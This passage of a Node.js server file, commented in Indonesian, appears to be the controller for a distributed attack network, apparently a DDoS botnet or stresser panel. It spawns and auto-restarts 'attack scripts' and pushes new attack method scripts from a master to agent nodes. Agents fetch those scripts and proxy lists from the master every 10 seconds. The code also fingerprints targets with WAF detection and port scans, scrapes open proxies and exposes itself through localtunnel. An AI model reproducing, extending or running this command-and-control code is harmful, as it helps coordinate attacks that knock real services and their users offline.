        `*PID baru:* \`${newProc.ls.pid}\``
      );
    }
    if (['exited', 'crashed'].includes(proc.status) && (proc.restartCount || 0) < 3) {
      const { scriptName, args } = proc;
      const newProc = spawnAttackScript(scriptName, args, pid);
      activeProcesses[pid] = {
        ...newProc,
        status: 'restarted',
        lastResponse: Date.now(),
        restartCount: (proc.restartCount || 0) + 1,
        scriptName,
        args
      };
      logActivity("RESTART_CRASHED", { processId: pid, pid: newProc.ls.pid });
      broadcastWS({ type: "attack_restarted", processId: pid, pid: newProc.ls.pid });
      await sendTelegramPhoto(
        `♻️ *Proses mati/crash direstart otomatis*\n` +
        `*Process ID:* \`${escapeTelegram(pid)}\`\n` +
        `*PID baru:* \`${newProc.ls.pid}\``
      );
    }
  }
}, 10000);

app.get('/api/attack/history', (req, res) => {
  if (req.query.key !== apiKey) return res.status(400).send('API key tidak valid');
  const history = readHistory();
  res.json(history);
});

app.post('/api/update', upload.single('file'), async (req, res) => {
  const key = req.query.key || req.body.key;
  if (key !== apiKey && key !== AGENT_KEY) return res.status(400).send('API key tidak valid');
  if (!req.file) return res.status(400).send('Tidak ada file ter-upload');

  const allowedExt = ['.js', '.sh'];
  const ext = path.extname(req.file.originalname).toLowerCase();
  const libMethodDir = path.join(__dirname, 'lib', 'method');
  if (!fs.existsSync(libMethodDir)) fs.mkdirSync(libMethodDir, { recursive: true });

  let moved = false;
  if (allowedExt.includes(ext)) {
    const destPath = path.join(libMethodDir, req.file.originalname);
    fs.renameSync(req.file.path, destPath);
    moved = true;
    logActivity("RECEIVE_UPDATE_MOVE", { file: req.file.originalname, size: req.file.size });
  } else {
    moved = false;
    logActivity("RECEIVE_UPDATE_OTHER", { file: req.file.originalname, size: req.file.size });
  }

  let syncResult = null;
  if (NODE_TYPE === 'agent') {
    try {
      const { data } = await axios.get(`${MASTER_URL}/api/methods`, {
        params: { key: AGENT_KEY }, timeout: 10000
      });
      fs.writeFileSync(methodsPath, JSON.stringify(data, null, 2));
      syncResult = { success: true, source: MASTER_URL, methodsCount: Object.keys(data).length };
      logActivity("AUTO_SYNC_METHODS_JSON", { from: MASTER_URL, size: Object.keys(data).length });
    } catch (err) {
      syncResult = { success: false, error: err.message, source: MASTER_URL };
      logActivity("AUTO_SYNC_METHODS_JSON_FAIL", { from: MASTER_URL, error: err.message });
    }
  }

  res.json({
    message: 'File update diterima',
    file: req.file.originalname,
    moved,
    mode: NODE_TYPE,
    sync: syncResult
  });
});

// Endpoint di master untuk push update ke semua agent
app.post('/api/agent/update', upload.single('file'), async (req, res) => {
  const key = req.query.key || req.body.key;
  if (key !== apiKey) return res.status(400).send('API key tidak valid');
  if (!req.file) return res.status(400).send('Tidak ada file ter-upload');

  const results = await Promise.all(AGENT_LIST.map(agent => {
    const form = new FormData();
    form.append('key', AGENT_KEY);
    form.append('file', fs.createReadStream(req.file.path), req.file.originalname);
    return axios.post(`${agent.url}/api/update`, form, { headers: form.getHeaders(), timeout: 10000 })
      .then(resp => ({ agent: agent, status: 'success', data: resp.data }))
      .catch(e => ({ agent: agent, status: 'failed', error: e.message }));
  }));

  logActivity("PUSH_UPDATE", { file: req.file.filename, results });
  broadcastWS({ type: "agent_update", results, file: req.file.filename });
  res.json({ message: 'Update didistribusikan', results });
});

app.get('/api/health', (req, res) => {
  res.json({
    status: 'online',
    uptime: process.uptime(),
    cpu: os.loadavg()[0],
    memory: Math.round(process.memoryUsage().rss / 1024 / 1024),
    totalMemory: Math.round(os.totalmem() / 1024 / 1024),
    hostname: os.hostname()
  });
});
app.get('/api/agents/health', async (req, res) => {
  const key = req.query.key;
  if (key !== apiKey) {
    return res.status(403).json({ message: "Invalid API key" });
  }

  const results = [];

  for (const agent of agents) {
    if (!agent.enabled) continue; // Lewati agent yang sudah dinonaktifkan

    try {
      const start = Date.now();
      const response = await axios.get(`${agent.url}/api/health`);
      const ping = Date.now() - start;

      results.push({
        agent,
        status: 'success',
        data: {
          ...response.data,
          ping // latensi dalam ms
        }
      });
    } catch (err) {
      // Tandai agent sebagai non-aktif jika gagal
      results.push({
        agent,
        status: 'error',
        error: err.message,
      });
      agent.enabled = false; // Disable agent yang offline
      logActivity("AGENT_DISABLED", { agent });
      saveAgents(); // Simpan status agent setelah di-disable
    }
  }
  res.json(results);
  broadcastWS({ type: "agent_health", agents: results });
});
setInterval(async () => {
  loadAgents(); // Pastikan AGENT_LIST selalu terbaru

  for (const agent of AGENT_LIST) {
    try {
      await axios.get(`${agent.url}/api/health`, { timeout: 5000 });

      // Jika sebelumnya disabled, enable lagi & log
      if (!agent.enabled) {
        agent.enabled = true;
        logActivity("AGENT_RE_ENABLED", { agent });
        saveAgents();
        broadcastWS({ type: "agent_status_update", agent });
      }
    } catch (err) {
      // Jika sebelumnya enabled, disable agent
      if (agent.enabled) {
        agent.enabled = false;
        logActivity("AGENT_DISABLED", { agent });
        saveAgents();
        broadcastWS({ type: "agent_status_update", agent });
      }
    }
  }
}, 10000); // 10 detik

app.get('/api/hostcheck', async (req, res) => {
  const key = req.query.key;
  const host = req.query.host;

  if (key !== apiKey) return res.status(403).send("API key tidak valid");
  if (!host) return res.status(400).send("Host tidak diberikan");

  try {
    // Normalisasi URL
    let urlToTest = host;
    if (!/^https?:\/\//i.test(host)) urlToTest = `http://${host}`;
    const parsed = new URL(urlToTest);
    const hostname = parsed.hostname;

    // Resolve IP
    let resolvedIp = '';
    try {
      const dnsRes = await dns.lookup(hostname);
      resolvedIp = dnsRes.address;
    } catch (e) {
      resolvedIp = hostname;
    }

    // Tes koneksi
    let online = false;
    let latency = null;
    let errorCode = null;

    try {
      const start = Date.now();
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      const resp = await fetch(urlToTest, { signal: controller.signal });
      clearTimeout(timeout);
      latency = Date.now() - start;
      if (resp.ok || (resp.status >= 200 && resp.status < 500)) {
        online = true;
      } else {
        errorCode = resp.status;
      }
    } catch (e) {
      online = false;
      errorCode = e.name === 'AbortError' ? 'TIMEOUT' : e.code || e.message || 'FETCH_ERROR';
    }

    // Info IP
    const ipInfoRes = await fetch(`https://ipwho.is/${resolvedIp}`);
    const ipInfo = await ipInfoRes.json();

    return res.json({
      status: online ? 'online' : 'offline',
      latency: latency,
      errorCode: online ? null : errorCode,
      ip: ipInfo.ip || resolvedIp,
      asn: ipInfo.connection?.asn || null,
      org: ipInfo.connection?.org || null,
      isp: ipInfo.connection?.isp || null,
      country: ipInfo.country || null,
      region: ipInfo.region || null,
      city: ipInfo.city || null,
      latitude: ipInfo.latitude || null,
      longitude: ipInfo.longitude || null
    });
  } catch (e) {
    return res.status(500).json({ error: 'Gagal memeriksa host', detail: e.message });
  }
});

app.get('/api/fingerprint-full', async (req, res) => {
  const key = req.query.key;
  const target = req.query.target;
  if (key !== apiKey) return res.status(403).send("API key tidak valid");
  if (!target) return res.status(400).send("Parameter 'target' diperlukan");

  try {
    const result = {
      target,
      urlInfo: {},
      dnsInfo: {},
      wafDetection: null,
      whois: {},
      geo: {},
      openPorts: [],
      error: null
    };

    const urlToTest = /^https?:\/\//.test(target) ? target : `http://${target}`;
    const parsed = new URL(urlToTest);
    const hostname = parsed.hostname;

    // DNS Lookup
    try {
      const dnsRes = await dns.lookup(hostname);
      result.dnsInfo.ip = dnsRes.address;
    } catch (e) {
      result.dnsInfo.ip = null;
    }

    // HTTP HEAD request
    try {
      const head = await fetch(urlToTest, { method: 'HEAD', timeout: 5000 });
      const headers = {};
      head.headers.forEach((v, k) => headers[k] = v);
      result.urlInfo.headers = headers;
      result.urlInfo.status = head.status;
      result.urlInfo.server = headers['server'] || null;
      result.urlInfo.poweredBy = headers['x-powered-by'] || null;

      // WAF/CDN Detection
      if (headers['server']?.toLowerCase().includes('cloudflare') || headers['cf-ray']) {
        result.wafDetection = 'Cloudflare';
      } else if (headers['x-sucuri-id']) {
        result.wafDetection = 'Sucuri';
      } else if (headers['x-akamai-transformed']) {
        result.wafDetection = 'Akamai';
      } else if (headers['x-cdn']) {
        result.wafDetection = `CDN - ${headers['x-cdn']}`;
      }
    } catch (e) {
      result.urlInfo.error = 'Gagal ambil header: ' + e.message;
    }

    // WHOIS Lookup
    try {
      const whoisData = await whois(hostname);
      result.whois = {
        asn: whoisData.asn || whoisData['origin'] || null,
        org: whoisData.org || whoisData['OrgName'] || null,
        country: whoisData.country || whoisData['Country'] || null
      };
    } catch (e) {
      result.whois = { error: e.message };
    }

    // GeoIP / ASN info via ipwho.is
    try {
      if (result.dnsInfo.ip) {
        const ipInfoRes = await fetch(`https://ipwho.is/${result.dnsInfo.ip}`);
        const ipInfo = await ipInfoRes.json();
        result.geo = {
          asn: ipInfo.connection?.asn,
          org: ipInfo.connection?.org,
          isp: ipInfo.connection?.isp,
          country: ipInfo.country,
          city: ipInfo.city,
          region: ipInfo.region
        };
      }
    } catch (e) {
      result.geo = { error: e.message };
    }

    // Port scan (tanpa nmap)
    if (result.dnsInfo.ip) {
      try {
        result.openPorts = await scanCommonPorts(result.dnsInfo.ip);
      } catch (e) {
        result.openPortsError = e.message;
      }
    }

    res.json(result);
  } catch (e) {
    res.status(500).json({ error: 'Gagal fingerprint', detail: e.message });
  }
});

// === SCRAPE PROXY (NON-GITHUB) + SINKRONISASI KE AGENT ===

const SCRAPE_SOURCES = [
  // ProxyScrape API v2
  { url: 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=4000&country=all&ssl=all&anonymity=all', proto: 'http' },
  { url: 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=4000&country=all&ssl=all&anonymity=all', proto: 'socks4' },
  { url: 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=4000&country=all&ssl=all&anonymity=all', proto: 'socks5' },
  // Proxy-list.download
  { url: 'https://www.proxy-list.download/api/v1/get?type=http', proto: 'http' },
  { url: 'https://www.proxy-list.download/api/v1/get?type=socks4', proto: 'socks4' },
  { url: 'https://www.proxy-list.download/api/v1/get?type=socks5', proto: 'socks5' },
  // Spys.me (mix type)
  { url: 'https://spys.me/proxy.txt', proto: 'mix' }
];

// Hanya menerima baris ip:port dari berbagai format
function parseProxyLine(line) {
  line = line.trim();
  // Spys.me: ip:port ... U:xxxxxxx => ambil sebelum spasi
  if (/^\d{1,3}(\.\d{1,3}){3}:\d+/.test(line)) {
    return line.split(/\s/)[0];
  }
  return null;
}

async function scrapeProxy({ protocols = ['http', 'socks4', 'socks5'], country = 'ALL' } = {}) {
  const axios = require('axios');
  let proxies = [];
  let stats = { total: 0, byProto: {}, byCountry: {} };

  for (const src of SCRAPE_SOURCES) {
    if (src.proto !== 'mix' && !protocols.includes(src.proto)) continue;
    try {
      const resp = await axios.get(src.url, { timeout: 15000 });
      let lines = resp.data.split('\n').map(l => l.trim()).filter(Boolean);

      if (src.url.includes("spys.me")) {
        lines = lines.filter(l => /^\d{1,3}(\.\d{1,3}){3}:\d+/.test(l));
      }

      let filtered = lines.map(l => parseProxyLine(l)).filter(Boolean);
      if (src.proto !== "mix") {
        stats.byProto[src.proto] = (stats.byProto[src.proto] || 0) + filtered.length;
      } else {
        stats.byProto['mix'] = (stats.byProto['mix'] || 0) + filtered.length;
      }

      proxies = proxies.concat(filtered);
    } catch (e) {
      if (typeof logActivity === 'function') logActivity('SCRAPE_FAIL', {url:src.url, error:e.message});
    }
  }
  proxies = Array.from(new Set(proxies));
  stats.total = proxies.length;

  const proxyTxtPath = path.join(__dirname, 'proxy.txt');
  fs.writeFileSync(proxyTxtPath, proxies.join('\n'), 'utf8');
  if (typeof logActivity === 'function') logActivity("SCRAPE_PROXY", { total: proxies.length, protocols, country });

  return { proxies, stats };
}

// ENDPOINT SCRAPE DAN SYNC KE AGENT
app.get('/api/scrape-proxies', async (req, res) => {
  const key = req.query.key;
  const protocols = (req.query.protocols || 'http,socks4,socks5').split(',').map(e=>e.trim().toLowerCase()).filter(Boolean);
  const country = req.query.country || 'ALL';

  if (key !== apiKey) return res.status(403).json({ message: "API key tidak valid" });

  try {
    const { proxies, stats } = await scrapeProxy({ protocols, country });

    // HILANGKAN SINKRONISASI KE AGENT

    res.json({
      message: 'Scrape proxy selesai',
      total: stats.total,
      byProto: stats.byProto,
      example: proxies.slice(0,5)
      // Tidak ada syncResults
    });
  } catch (e) {
    res.status(500).json({ error: e.message || e.toString() });
  }
});

// AGENT menerima update proxy baru dari master
app.post('/api/update-proxy', upload.single('file'), (req, res) => {
  const key = req.query.key || req.body.key;
  if (key !== apiKey && key !== AGENT_KEY) return res.status(400).send('API key tidak valid');
  if (!req.file) return res.status(400).send('Tidak ada file proxy ter-upload');

  const destPath = path.join(__dirname, 'proxy.txt');
  fs.renameSync(req.file.path, destPath);
  if (typeof logActivity === 'function') logActivity("RECEIVE_PROXY_UPDATE", { size: req.file.size });
  res.json({ message: 'Proxy.txt berhasil diupdate', size: req.file.size });
});

async function getPublicIp() {
  try {
    const { data } = await axios.get('https://api.ipify.org?format=json', { timeout: 5000 });
    return data.ip;
  } catch (e) {
    logActivity("GET_PUBLIC_IP_FAIL", { error: e.message });
    return 'localhost';
  }
}
async function autoRegisterToMaster() {
  if (NODE_TYPE !== 'agent') return;

  let agentName = "";
  const publicIp = await getPublicIp();
  const agentUrl = `http://${publicIp}:${port}`;

  try {
    // 1. Ambil daftar agent eksisting dari master
    const { data: agents } = await axios.get(`${MASTER_URL}/api/agents`, {
      params: { key: AGENT_KEY },
      timeout: 10000
    });

    // 2. Cari nama srv1, srv2, dst yang belum dipakai
    let n = 1;
    const maxTry = 50;
    let usedNames = new Set((agents || []).map(a => a.name));
    for (; n <= maxTry; n++) {
      if (!usedNames.has(`srv${n}`)) break;
    }
    agentName = `srv${n}`;
  } catch (e) {
    agentName = `srv1`; // fallback jika tidak bisa get agents
  }

  try {
    const { data } = await axios.post(`${MASTER_URL}/api/agents/register`, {
      name: agentName,
      url: agentUrl,
      agentKey: AGENT_KEY
    }, { timeout: 10000 });
    logActivity("AUTO_REGISTER_MASTER", { result: data, agentName });
  } catch (e) {
    logActivity("AUTO_REGISTER_MASTER_FAIL", { error: e.message, agentName });
  }
}

// ===== AUTO SYNC AGENT FROM MASTER =====
async function autoSyncFromMaster() {
  if (NODE_TYPE !== 'agent') return;
  try {
    // 1. Ambil daftar methods.json dari master
    const { data: methodsData } = await axios.get(`${MASTER_URL}/api/methods`, {
      params: { key: AGENT_KEY }, timeout: 10000
    });
    fs.writeFileSync(methodsPath, JSON.stringify(methodsData, null, 2));
    logActivity("AUTO_SYNC_METHODS_JSON", { from: MASTER_URL, size: Object.keys(methodsData).length });

    // 2. Dapatkan daftar nama file script yang seharusnya ada (dari methodsData)
    const shouldHaveFiles = new Set(
      Object.values(methodsData)
        .map(m => m.script)
        .filter(Boolean)
    );

    // 3. Ambil daftar file yang ada di folder agent
    const localDir = path.join(__dirname, 'lib', 'method');
    if (!fs.existsSync(localDir)) fs.mkdirSync(localDir, { recursive: true });
    const localFiles = fs.readdirSync(localDir).filter(f => f.endsWith('.js') || f.endsWith('.sh'));

    // 4. Hapus file yang tidak ada di master (mirror)
    for (const file of localFiles) {
      if (!shouldHaveFiles.has(file)) {
        try {
          fs.unlinkSync(path.join(localDir, file));
          logActivity("AUTO_MIRROR_REMOVE_FILE", { file });
        } catch (e) {
          logActivity("AUTO_MIRROR_REMOVE_FAIL", { file, error: e.message });
        }
      }
    }

    // 5. Download file dari master jika belum ada di agent
    for (const scriptName of shouldHaveFiles) {
      const localPath = path.join(localDir, scriptName);
      if (!fs.existsSync(localPath)) {
        try {
          const url = `${MASTER_URL}/lib/method/${encodeURIComponent(scriptName)}`;
          const resp = await axios.get(url, { responseType: 'stream', timeout: 10000 });
          const writer = fs.createWriteStream(localPath);
          await new Promise((resolve, reject) => {
            resp.data.pipe(writer);
            writer.on('finish', resolve);
            writer.on('error', reject);
          });
          logActivity("AUTO_SYNC_METHOD_FILE", { scriptName });
        } catch (err) {
          logActivity("AUTO_SYNC_METHOD_FILE_FAIL", { scriptName, error: err.message });
        }
      }
    }

    // 6. AUTO SYNC proxy.txt dari master
    try {
      const proxyUrl = `${MASTER_URL}/proxy.txt`;
      const localProxyPath = path.join(__dirname, 'proxy.txt');
      const resp = await axios.get(proxyUrl, { responseType: 'stream', timeout: 10000 });
      const writer = fs.createWriteStream(localProxyPath);
      await new Promise((resolve, reject) => {
        resp.data.pipe(writer);
        writer.on('finish', resolve);
        writer.on('error', reject);
      });
      logActivity("AUTO_SYNC_PROXY_TXT", { from: MASTER_URL });
    } catch (err) {
      logActivity("AUTO_SYNC_PROXY_TXT_FAIL", { from: MASTER_URL, error: err.message });
    }

  } catch (err) {
    logActivity("AUTO_SYNC_METHODS_JSON_FAIL", { from: MASTER_URL, error: err.message });
  }
}
if (NODE_TYPE === 'agent') {
  autoRegisterToMaster();
  setInterval(autoRegisterToMaster, 60 * 1000); // setiap 1 menit register ulang
  autoSyncFromMaster();
  setInterval(autoSyncFromMaster, 10 * 1000); // setiap 10 detik sync
}

// === Listen ===
app.get('/', (req, res) => {
  res.redirect('/dashboard');
});
httpServer.listen(port, async () => {
  console.clear();
  let ip = 'localhost';
  try {
    ip = execSync("curl -s ifconfig.me").toString().trim();
  } catch (e) {}
  console.log(`SERVER ONLINE: http://${ip}:${port}:${apiKey}`);

  // ==== LOCAL TUNNEL AUTORETRY ====
  async function startLocalTunnel(retryCount = 10) {
    const localtunnel = require('localtunnel');
    let tunnel = null;
    for (let i = 1; i <= retryCount; i++) {
      try {
        // Gunakan subdomain acak (optional)
        // const subdomain = 'agent' + Math.floor(Math.random()*1000000);
        // tunnel = await localtunnel({ port, subdomain });

        tunnel = await localtunnel({ port }); // subdomain random dari localtunnel
        if (tunnel.url) {
          console.log('\x1b[32m%s\x1b[0m', 'Agent URL via LocalTunnel:', tunnel.url);
          tunnel.on('close', () => {
            console.log('LocalTunnel closed.');
          });
          return tunnel;
        } else {
          throw new Error('LocalTunnel tidak mengembalikan URL');
        }
      } catch (err) {
        console.error(`LocalTunnel failed (attempt ${i}):`, err.message);
        if (i === retryCount) {
          console.error('\x1b[31m%s\x1b[0m', 'Gagal konek LocalTunnel setelah beberapa percobaan. Server tetap berjalan.');
        } else {
          await new Promise(r => setTimeout(r, 3000)); // tunggu 3 detik sebelum retry
        }
      }
    }
    return null;
  }

  // Jalankan LocalTunnel autoretry
  await startLocalTunnel(10); // max 10 kali coba

  logActivity("SERVER_START", { ip, port, nodeType: NODE_TYPE });
});

process.on('SIGINT', () => {
  logActivity("SIGINT", { msg: "Menutup aplikasi..." });
  process.exit();
});
